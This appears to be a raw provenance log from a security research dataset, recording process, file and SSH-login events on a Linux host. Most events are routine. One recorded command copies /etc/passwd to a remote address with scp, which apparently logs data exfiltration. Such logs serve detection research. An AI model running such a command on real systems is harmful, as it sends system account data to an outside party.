1558118430.822:2320407022,70E4B26F-4606-9086-3279-B302961E953A:sshd,EXECUTE,B9B4F707-574A-FA88-7419-4B04DE2EDA87,bash,ta1-trace-2
1558118430.822:2320406910,D3EFE7DE-6DAE-1069-1254-C6D6E8286590:sshd,FORK,70E4B26F-4606-9086-3279-B302961E953A,sshd,ta1-trace-2
1558118430.822:2320406863,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.822:2320406855,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.822:2320406827,1C7D600B-BEA3-E29E-41E5-EC2A3E160942:sshd,CHANGE_PRINCIPAL,D3EFE7DE-6DAE-1069-1254-C6D6E8286590,sshd,ta1-trace-2
1558118430.822:2320406799,6D0D30DA-E915-C439-9026-4070ABB8B5CF:sshd,CHANGE_PRINCIPAL,1C7D600B-BEA3-E29E-41E5-EC2A3E160942,sshd,ta1-trace-2
1558118430.818:2320406793,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,FORK,6D0D30DA-E915-C439-9026-4070ABB8B5CF,sshd,ta1-trace-2
1558118430.818:2320406784,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.818:2320406748,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.818:2320406745,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.818:2320406742,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.818:2320406666,159253AF-9B69-F803-D58A-9C6A1DDEBE1F:update-motd-fsc,EXECUTE,FAF1BA9D-8564-F104-6A0A-CB623B4B9FC1,cat,ta1-trace-2
1558118430.818:2320406664,2A375DD1-FCED-5DE4-D2AC-0FB864A18460:update-motd-fsc,FORK,159253AF-9B69-F803-D58A-9C6A1DDEBE1F,update-motd-fsc,ta1-trace-2
1558118430.814:2320406449,C718EE08-64AA-2838-7A9A-8700C8758BA8:98-fsck-at-rebo,EXECUTE,2A375DD1-FCED-5DE4-D2AC-0FB864A18460,update-motd-fsc,ta1-trace-2
1558118430.814:2320406427,4914735E-C899-63BF-FD0F-9F644A3F12AD:run-parts,EXECUTE,C718EE08-64AA-2838-7A9A-8700C8758BA8,98-fsck-at-rebo,ta1-trace-2
1558118430.814:2320406426,E037784D-1747-0A08-3FAD-A38AF35B378D:run-parts,FORK,4914735E-C899-63BF-FD0F-9F644A3F12AD,run-parts,ta1-trace-2
1558118430.814:2320406376,2EB1F0A9-D9B8-4A84-0F61-2ECC1940C288:update-motd-hwe,EXECUTE,B2F20960-10B0-4B65-4C98-CF3C2D85F6B2,cat,ta1-trace-2
1558118430.814:2320406374,9BCA3460-9725-9AB3-1AB1-35E86B64E542:update-motd-hwe,FORK,2EB1F0A9-D9B8-4A84-0F61-2ECC1940C288,update-motd-hwe,ta1-trace-2
1558118430.790:2320404966,F3FB9A65-0290-8877-7BBB-5672AC0832A8:95-hwe-eol,EXECUTE,9BCA3460-9725-9AB3-1AB1-35E86B64E542,update-motd-hwe,ta1-trace-2
1558118430.790:2320404945,D218C823-D016-452D-199A-867CC0DA092B:run-parts,EXECUTE,F3FB9A65-0290-8877-7BBB-5672AC0832A8,95-hwe-eol,ta1-trace-2
1558118430.790:2320404944,E037784D-1747-0A08-3FAD-A38AF35B378D:run-parts,FORK,D218C823-D016-452D-199A-867CC0DA092B,run-parts,ta1-trace-2
1558118430.766:2320404565,5EA26174-5136-05CF-08FA-519492DBCB53:lsb_release,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.750:2320404309,BA57F823-A667-7D41-224A-4E55194DE49D:91-release-upgr,EXECUTE,5EA26174-5136-05CF-08FA-519492DBCB53,lsb_release,ta1-trace-2
1558118430.750:2320404283,0EF24D85-8B30-1F4A-621C-87E38BE9E5C6:91-release-upgr,FORK,BA57F823-A667-7D41-224A-4E55194DE49D,91-release-upgr,ta1-trace-2
1558118430.750:2320404276,98117A06-E2B7-7BE2-D8DA-92B0D43FB9C6:91-release-upgr,FORK,0EF24D85-8B30-1F4A-621C-87E38BE9E5C6,91-release-upgr,ta1-trace-2
1558118430.750:2320404252,D402C367-1351-2E20-1F6B-BE818132016D:run-parts,EXECUTE,98117A06-E2B7-7BE2-D8DA-92B0D43FB9C6,91-release-upgr,ta1-trace-2
1558118430.750:2320404251,E037784D-1747-0A08-3FAD-A38AF35B378D:run-parts,FORK,D402C367-1351-2E20-1F6B-BE818132016D,run-parts,ta1-trace-2
1558118430.750:2320404221,29A35572-EEC9-5F1B-1CE0-31D350D99BD6:update-motd-upd,EXECUTE,A48DF41A-5C03-382E-0215-DCAEAD68D911,cat,ta1-trace-2
1558118430.750:2320404218,C4BB4498-8ADA-D86C-FF55-54324829EE9D:update-motd-upd,FORK,29A35572-EEC9-5F1B-1CE0-31D350D99BD6,update-motd-upd,ta1-trace-2
1558118430.730:2320403134,D66BE400-E494-95D4-CDD0-0970E77F785F:90-updates-avai,EXECUTE,C4BB4498-8ADA-D86C-FF55-54324829EE9D,update-motd-upd,ta1-trace-2
1558118430.730:2320403113,2015F846-2C61-FC5D-01C4-A471CDEA17E4:run-parts,EXECUTE,D66BE400-E494-95D4-CDD0-0970E77F785F,90-updates-avai,ta1-trace-2
1558118430.730:2320403112,E037784D-1747-0A08-3FAD-A38AF35B378D:run-parts,FORK,2015F846-2C61-FC5D-01C4-A471CDEA17E4,run-parts,ta1-trace-2
1558118430.586:2320394161,D73217D3-5284-8BFE-6148-691782CFB0A1:landscape-sysin,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.582:2320393651,85B15E04-C702-029D-F8DB-E7239DAF64D0:50-landscape-sy,EXECUTE,D73217D3-5284-8BFE-6148-691782CFB0A1,landscape-sysin,ta1-trace-2
1558118430.582:2320393643,44B1F0DB-CA5D-79A1-8335-FD3A0D3EB0BC:50-landscape-sy,FORK,85B15E04-C702-029D-F8DB-E7239DAF64D0,50-landscape-sy,ta1-trace-2
1558118430.578:2320393393,E98B130B-7F67-84C4-664C-F024CD96F0B8:run-parts,EXECUTE,44B1F0DB-CA5D-79A1-8335-FD3A0D3EB0BC,50-landscape-sy,ta1-trace-2
1558118430.578:2320393390,E037784D-1747-0A08-3FAD-A38AF35B378D:run-parts,FORK,E98B130B-7F67-84C4-664C-F024CD96F0B8,run-parts,ta1-trace-2
1558118430.574:2320393060,A69D0CFD-5558-E356-1285-3204504FBD07:env,EXECUTE,E037784D-1747-0A08-3FAD-A38AF35B378D,run-parts,ta1-trace-2
1558118430.574:2320393032,38546869-42EE-E332-6849-88A3CFAABDD6:sh,EXECUTE,A69D0CFD-5558-E356-1285-3204504FBD07,env,ta1-trace-2
1558118430.574:2320393022,0A1BCE05-3201-B5FF-22F8-63CAF3FD14C7:sh,FORK,38546869-42EE-E332-6849-88A3CFAABDD6,sh,ta1-trace-2
1558118430.574:2320392963,29B41552-EAAF-3791-2831-9D8C7585CA29:sshd,EXECUTE,0A1BCE05-3201-B5FF-22F8-63CAF3FD14C7,sh,ta1-trace-2
1558118430.574:2320392938,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,FORK,29B41552-EAAF-3791-2831-9D8C7585CA29,sshd,ta1-trace-2
1558118430.574:2320392930,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.554:2320392433,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.554:2320392381,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.554:2320392369,20353FD9-D178-6E67-5FC0-1CE2D3A0ED79:sshd,CHANGE_PRINCIPAL,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7,sshd,ta1-trace-2
1558118430.554:2320392368,71C45DAB-BEB5-6424-E8DD-B81AA473D269:sshd,CHANGE_PRINCIPAL,20353FD9-D178-6E67-5FC0-1CE2D3A0ED79,sshd,ta1-trace-2
1558118430.554:2320392367,20353FD9-D178-6E67-5FC0-1CE2D3A0ED79:sshd,CHANGE_PRINCIPAL,71C45DAB-BEB5-6424-E8DD-B81AA473D269,sshd,ta1-trace-2
1558118430.554:2320392366,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,CHANGE_PRINCIPAL,20353FD9-D178-6E67-5FC0-1CE2D3A0ED79,sshd,ta1-trace-2
1558118430.554:2320392364,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.554:2320392350,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.554:2320392310,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558118430.554:2320392307,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.550:2320392282,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558118430.550:2320392279,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.446:2320391754,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.446:2320391722,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558118430.446:2320391721,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558118430.354:2320391346,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118430.350:2320391082,A5CD6440-30DB-E6F7-06E6-80E33CE3AAEC:sshd,EXECUTE,408E95EB-E1F8-F0F0-4BF1-DEA42F5A0DF7,sshd,ta1-trace-2
1558118430.350:2320391056,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,A5CD6440-30DB-E6F7-06E6-80E33CE3AAEC,sshd,ta1-trace-2
1558118429.198:2320387886,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118429.198:2320387802,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118429.198:2320387728,16D7FC90-B20D-4193-92F0-8379AB4FF665:sshd,CHANGE_PRINCIPAL,694814D8-F572-B234-B26A-77149C30A605,sshd,ta1-trace-2
1558118429.198:2320387727,16D7FC90-B20D-4193-92F0-8379AB4FF665:sshd,CHANGE_PRINCIPAL,16D7FC90-B20D-4193-92F0-8379AB4FF665,sshd,ta1-trace-2
1558118429.198:2320387726,694814D8-F572-B234-B26A-77149C30A605:sshd,CHANGE_PRINCIPAL,16D7FC90-B20D-4193-92F0-8379AB4FF665,sshd,ta1-trace-2
1558118428.858:2320381793,4B67FC0B-9B37-7D7C-0600-D525C7127009:bash,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381710,807615A5-94CB-9656-C026-E0E0C997F851:sshd,EXECUTE,4B67FC0B-9B37-7D7C-0600-D525C7127009,bash,ta1-trace-2
1558118428.854:2320381600,47800F1E-ECBF-F4A4-7209-1DF5ED41BF38:sshd,FORK,807615A5-94CB-9656-C026-E0E0C997F851,sshd,ta1-trace-2
1558118428.854:2320381554,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381548,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381528,298F1B10-94C1-ED4D-3A31-FF45487DEE58:sshd,CHANGE_PRINCIPAL,47800F1E-ECBF-F4A4-7209-1DF5ED41BF38,sshd,ta1-trace-2
1558118428.854:2320381506,73B986C6-E1D1-36BA-9227-44F48B2F6FB7:sshd,CHANGE_PRINCIPAL,298F1B10-94C1-ED4D-3A31-FF45487DEE58,sshd,ta1-trace-2
1558118428.854:2320381502,694814D8-F572-B234-B26A-77149C30A605:sshd,FORK,73B986C6-E1D1-36BA-9227-44F48B2F6FB7,sshd,ta1-trace-2
1558118428.854:2320381493,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381457,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381454,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.854:2320381451,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.850:2320381375,C8EB9052-6BB1-6429-98EF-139CFED0F979:update-motd-fsc,EXECUTE,78BF80BD-6E12-7188-97AB-3B742EEE38AD,cat,ta1-trace-2
1558118428.850:2320381373,27FBAB71-4897-14EC-1F3B-6F8E5351C13E:update-motd-fsc,FORK,C8EB9052-6BB1-6429-98EF-139CFED0F979,update-motd-fsc,ta1-trace-2
1558118428.850:2320381158,82BBA912-9EA6-7E65-2703-8332813AD286:98-fsck-at-rebo,EXECUTE,27FBAB71-4897-14EC-1F3B-6F8E5351C13E,update-motd-fsc,ta1-trace-2
1558118428.850:2320381136,46CE8880-9034-EF28-350A-983B37037E2A:run-parts,EXECUTE,82BBA912-9EA6-7E65-2703-8332813AD286,98-fsck-at-rebo,ta1-trace-2
1558118428.850:2320381135,338B1FB0-1D3F-6A49-132F-45612CE5E4CF:run-parts,FORK,46CE8880-9034-EF28-350A-983B37037E2A,run-parts,ta1-trace-2
1558118428.846:2320381077,965B6593-C170-43CD-7F2F-1D8DB5A69ADF:update-motd-hwe,EXECUTE,643DCB30-00CC-39D8-F9B5-25824D06C1B8,cat,ta1-trace-2
1558118428.846:2320381073,51CA6C18-9E0A-D4A5-47F1-34FBC04F54C4:update-motd-hwe,FORK,965B6593-C170-43CD-7F2F-1D8DB5A69ADF,update-motd-hwe,ta1-trace-2
1558118428.830:2320379701,DAE75035-4825-28FE-F0B1-EBBFECCAF58B:95-hwe-eol,EXECUTE,51CA6C18-9E0A-D4A5-47F1-34FBC04F54C4,update-motd-hwe,ta1-trace-2
1558118428.830:2320379680,1D49A08F-46DD-7C63-DF25-91D06D4D043D:run-parts,EXECUTE,DAE75035-4825-28FE-F0B1-EBBFECCAF58B,95-hwe-eol,ta1-trace-2
1558118428.830:2320379679,338B1FB0-1D3F-6A49-132F-45612CE5E4CF:run-parts,FORK,1D49A08F-46DD-7C63-DF25-91D06D4D043D,run-parts,ta1-trace-2
1558118428.810:2320379302,18E378B6-3C98-A3E5-56DD-AF2F1A3B72F0:lsb_release,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.802:2320379042,2B17F7EF-1C1C-F681-DC39-3D473540CC09:91-release-upgr,EXECUTE,18E378B6-3C98-A3E5-56DD-AF2F1A3B72F0,lsb_release,ta1-trace-2
1558118428.802:2320379033,762CE25C-5006-77D6-E61E-09A938DE5021:91-release-upgr,FORK,2B17F7EF-1C1C-F681-DC39-3D473540CC09,91-release-upgr,ta1-trace-2
1558118428.802:2320379026,8228FB9F-C3C4-A7A4-E417-7DAB33BBE0D9:91-release-upgr,FORK,762CE25C-5006-77D6-E61E-09A938DE5021,91-release-upgr,ta1-trace-2
1558118428.802:2320379004,DA178D18-9647-2CB3-65E1-97D37A965293:run-parts,EXECUTE,8228FB9F-C3C4-A7A4-E417-7DAB33BBE0D9,91-release-upgr,ta1-trace-2
1558118428.802:2320379003,338B1FB0-1D3F-6A49-132F-45612CE5E4CF:run-parts,FORK,DA178D18-9647-2CB3-65E1-97D37A965293,run-parts,ta1-trace-2
1558118428.798:2320378977,07404751-E8BF-A9E8-8A40-92C3D77E3AB8:update-motd-upd,EXECUTE,DB5A64AD-E2B7-4854-B34E-9A76E5F5E97A,cat,ta1-trace-2
1558118428.798:2320378975,A953D4B0-B8A0-67A6-2A6F-8CDFCF03FFAD:update-motd-upd,FORK,07404751-E8BF-A9E8-8A40-92C3D77E3AB8,update-motd-upd,ta1-trace-2
1558118428.786:2320377922,65183107-44E7-2C92-8F88-058A7BC17F9A:90-updates-avai,EXECUTE,A953D4B0-B8A0-67A6-2A6F-8CDFCF03FFAD,update-motd-upd,ta1-trace-2
1558118428.786:2320377901,ED1F765B-11CE-8C43-B198-EE939CAFABD3:run-parts,EXECUTE,65183107-44E7-2C92-8F88-058A7BC17F9A,90-updates-avai,ta1-trace-2
1558118428.786:2320377900,338B1FB0-1D3F-6A49-132F-45612CE5E4CF:run-parts,FORK,ED1F765B-11CE-8C43-B198-EE939CAFABD3,run-parts,ta1-trace-2
1558118428.666:2320370732,7897EC54-91E0-6817-44D7-4D7AB4F468D5:landscape-sysin,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.658:2320370307,5E92880A-321C-B5E5-0297-160A860513C0:50-landscape-sy,EXECUTE,7897EC54-91E0-6817-44D7-4D7AB4F468D5,landscape-sysin,ta1-trace-2
1558118428.658:2320370304,8181CC53-D88D-F09D-C843-723B39B6D1C7:50-landscape-sy,FORK,5E92880A-321C-B5E5-0297-160A860513C0,50-landscape-sy,ta1-trace-2
1558118428.658:2320370041,5EF2655E-3D53-0E37-C316-47C31482BB49:run-parts,EXECUTE,8181CC53-D88D-F09D-C843-723B39B6D1C7,50-landscape-sy,ta1-trace-2
1558118428.658:2320370038,338B1FB0-1D3F-6A49-132F-45612CE5E4CF:run-parts,FORK,5EF2655E-3D53-0E37-C316-47C31482BB49,run-parts,ta1-trace-2
1558118428.650:2320369685,C6E4C563-A8A4-30B3-A4EE-2AE10D3EAB21:env,EXECUTE,338B1FB0-1D3F-6A49-132F-45612CE5E4CF,run-parts,ta1-trace-2
1558118428.650:2320369661,AE65D8D1-990B-2437-D1B5-C9E1688D4FA1:sh,EXECUTE,C6E4C563-A8A4-30B3-A4EE-2AE10D3EAB21,env,ta1-trace-2
1558118428.650:2320369645,935F586B-B57C-7B02-8837-A6D6245A1E57:sh,FORK,AE65D8D1-990B-2437-D1B5-C9E1688D4FA1,sh,ta1-trace-2
1558118428.650:2320369593,F42B20ED-F2B6-DBCE-8778-F460F443C624:sshd,EXECUTE,935F586B-B57C-7B02-8837-A6D6245A1E57,sh,ta1-trace-2
1558118428.650:2320369497,694814D8-F572-B234-B26A-77149C30A605:sshd,FORK,F42B20ED-F2B6-DBCE-8778-F460F443C624,sshd,ta1-trace-2
1558118428.650:2320369477,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.626:2320369142,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.626:2320369090,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.626:2320369078,44C7B55C-D207-04EE-D547-5D7E200A0950:sshd,CHANGE_PRINCIPAL,694814D8-F572-B234-B26A-77149C30A605,sshd,ta1-trace-2
1558118428.626:2320369077,051F6D60-E683-DB28-9013-37A16BB1153D:sshd,CHANGE_PRINCIPAL,44C7B55C-D207-04EE-D547-5D7E200A0950,sshd,ta1-trace-2
1558118428.626:2320369076,44C7B55C-D207-04EE-D547-5D7E200A0950:sshd,CHANGE_PRINCIPAL,051F6D60-E683-DB28-9013-37A16BB1153D,sshd,ta1-trace-2
1558118428.626:2320369075,694814D8-F572-B234-B26A-77149C30A605:sshd,CHANGE_PRINCIPAL,44C7B55C-D207-04EE-D547-5D7E200A0950,sshd,ta1-trace-2
1558118428.626:2320369073,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.626:2320369059,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.626:2320369019,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558118428.626:2320369016,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.614:2320368971,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1558118428.614:2320368968,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.510:2320368582,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.510:2320368550,694814D8-F572-B234-B26A-77149C30A605:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558118428.510:2320368549,694814D8-F572-B234-B26A-77149C30A605:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1558118428.414:2320368188,694814D8-F572-B234-B26A-77149C30A605:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118428.410:2320367914,1F41B4E5-15A2-6949-7D85-F5060491A00D:sshd,EXECUTE,694814D8-F572-B234-B26A-77149C30A605,sshd,ta1-trace-2
1558118428.410:2320367893,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,1F41B4E5-15A2-6949-7D85-F5060491A00D,sshd,ta1-trace-2
1558118424.262:2320356992,57D3E3F8-D654-2E10-28A9-F2CE8CFDFB05:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118424.262:2320356946,57D3E3F8-D654-2E10-28A9-F2CE8CFDFB05:sshd,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118424.258:2320356811,26640B66-F308-8DC0-7486-D3F20DB48BF4:sshd,CHANGE_PRINCIPAL,57D3E3F8-D654-2E10-28A9-F2CE8CFDFB05,sshd,ta1-trace-2
1558118424.258:2320356810,26640B66-F308-8DC0-7486-D3F20DB48BF4:sshd,CHANGE_PRINCIPAL,26640B66-F308-8DC0-7486-D3F20DB48BF4,sshd,ta1-trace-2
1558118424.258:2320356809,57D3E3F8-D654-2E10-28A9-F2CE8CFDFB05:sshd,CHANGE_PRINCIPAL,26640B66-F308-8DC0-7486-D3F20DB48BF4,sshd,ta1-trace-2
1558118421.150:2320350194,8E97276A-F1C5-B7BB-737F-AAE7184628DE:scp,READ,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349232,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349229,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349226,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349223,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349220,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349217,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.646:2320349214,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.642:2320349191,538DEB58-4BDB-CF16-CD25-AED3C531601E:ssh,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.642:2320349095,EAF08F0B-8D03-27C0-5D69-8A61103FF420:scp,EXECUTE,538DEB58-4BDB-CF16-CD25-AED3C531601E,ssh,ta1-trace-2
1558118420.642:2320349086,8E97276A-F1C5-B7BB-737F-AAE7184628DE:scp,FORK,EAF08F0B-8D03-27C0-5D69-8A61103FF420,scp,ta1-trace-2
1558118420.642:2320349079,8E97276A-F1C5-B7BB-737F-AAE7184628DE:scp,MMAP,9DF2BC15-6D03-7643-6845-F92C5F2D7DAC,/etc/passwd,ta1-trace-2
1558118420.638:2320349018,F2E9D9A4-50C8-F2AE-CD53-8D2631496093:bash,EXECUTE,8E97276A-F1C5-B7BB-737F-AAE7184628DE,b'scp -r /etc/passwd admin@128.55.12.79:./files/',ta1-trace-2
1558118420.638:2320349010,3EEB9C23-BC37-B508-7EC8-DBE3FA82E623:bash,FORK,F2E9D9A4-50C8-F2AE-CD53-8D2631496093,bash,ta1-trace-2
